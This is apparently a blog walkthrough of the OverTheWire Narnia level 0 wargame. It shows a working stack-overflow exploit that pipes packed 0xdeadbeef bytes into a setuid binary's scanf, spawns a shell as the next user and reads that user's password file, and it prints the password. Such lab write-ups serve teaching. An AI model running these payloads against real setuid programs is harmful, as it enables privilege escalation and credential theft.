__Narnia :: Level 0__
================


_Caleb Stewart_ | _Sunday, January 17th, 2016_ 

> The goal of this level is to show that the danger of using unsafe functions such as scanf or gets. Your task is to overwrite a local variable using a string prompt. As with most (if not all) narnia levels, the executable in /narnia/narnia0 is setuid for the narnia1 user, and therefore we can gain access to the password by having it execute a shell for us.

> The password for the next level is stored in /etc/narnia_pass/narnia1, which is only readable by the narnia1 user.

----------

If we run the narnia0 executable, we will see that it prompts us to overwrite a value in memory with the common hex phrase `0xdeadbeef`. 

```
narnia0@melinda:/tmp/tmp.zcUOn3DlkL$ /narnia/narnia0
Correct val's value from 0x41414141 -0xdeadbeef!
Here is your chance: Some interesting text. Should I enter 0xdeadbeef?
buf: Some
val: 0x41414141
WAY OFF!!!!
```

As you can see, you can type text in, and it will tell you if you correctly overwrote the variable. There are a few ways we solve this. Firstly, we can dump a huge number of these phrases into the string input and hope we overwrite the correct variable without breaking the program. We could also disassemble the program and attempt to reverse engineer what it does. With this information, we can simply count the difference between the stack variable we want, and the stack location upon calling scanf or gets. While the second solution is more technical and exact, it is also cumbersome and frustrating. I prefer the first solution.

In order to generate a lot of these hex phrases, we can use python. First we will generate the hex encoded string:

``` python
>>> import struct
>>> struct.pack('<I', 0xdeadbeef)
'\xef\xbe\xad\xde'
```

This is a string which, when evaluated by python, creates the binary representation of 0xdeadbeef we need. We can use this to actually dump the repeated binary data into the application. We combine that string with the multiplication operator in python to create, say, 100 copies and pipe them into the executable:

```
narnia0@melinda:/tmp/tmp.zcUOn3DlkL$ python -c "print '\xef\xbe\xad\xde'*100" | /narnia/narnia0 
> Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ
val: 0xdeadbeef
narnia0@melinda:/tmp/tmp.zcUOn3DlkL$ 
```

This looks great at first glance, but if we solved it then were is the password for the next level? We need a shell as narnia1 to continue. If we take a peek at the source code in /narnia/narnia0.c, we get a hint.

``` c
int main(){
        long val=0x41414141;
        char buf[20];

        printf("> Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
        printf("Here is your chance: ");
        scanf("%24s",&buf);

        printf("buf: %s\n",buf);
        printf("val: 0x%08x\n",val);

        if(val==0xdeadbeef)
                system("/bin/sh");
        else {
                printf("> WAY OFF!!!!\n");
                exit(1);
        }

        return 0;
}
```

Near the bottom, `val` is compared, and if it matches, the executable calls `/bin/sh`. This sounds great, but we didn't see a shell open! The problem is that when we run python and pipe it to the program, the input for the shell is then connected to python as well. When python closes, so does the shell. We can fix this by running `cat` in parallel with python. When python finishes, cat will read standard input from us, and send it to the shell we just ran. Here's how we'll do it:

```
narnia0@melinda:/tmp/tmp.zcUOn3DlkL$ (python -c "print '\xef\xbe\xad\xde'*100"; cat) | /narnia/narnia0
> Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ
val: 0xdeadbeef

```

The shell will hang, and you won't have a prompt, but don't fear! Try typing `whoami` and pressing enter. You should see `narnia1` printed to the screen. You shell is running, but you just can't see the prompt. Now, you can simply run `cat /etc/narnia_pass/narnia1`. Here's the whole thing:

```
narnia0@melinda:/tmp/tmp.zcUOn3DlkL$ (python -c "print '\xef\xbe\xad\xde'*100"; cat) | /narnia/narnia0
> Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ
val: 0xdeadbeef
ls /etc/narnia_pass/
narnia0  narnia1  narnia2  narnia3  narnia4  narnia5  narnia6  narnia7	narnia8  narnia9
cat /etc/narnia_pass/narnia1
efeidiedae
```

Congratulations! You just solved your first Narnia challenge!
